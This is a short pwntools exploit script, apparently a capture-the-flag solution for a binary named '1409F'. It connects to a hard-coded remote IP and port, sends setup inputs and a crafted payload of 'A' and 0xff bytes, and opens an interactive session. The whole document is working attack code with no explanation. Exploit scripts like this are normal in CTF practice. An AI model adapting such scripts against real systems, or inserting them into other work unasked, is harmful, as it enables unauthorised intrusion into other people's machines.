from pwn import *
import sys

elf = ELF('1409F')
context.update(os='linux', arch='amd64', binary=elf)

host = '143.198.127.103'
port = 42000

if args.LOCAL:
	p = elf.process()
else:
	p = remote(host, port)

p.sendline(b'2 0')
p.sendline(b'aa')

payload = b'A' * 3
payload += b'\xff' * 201
p.sendline(payload)

p.interactive()

p.close()
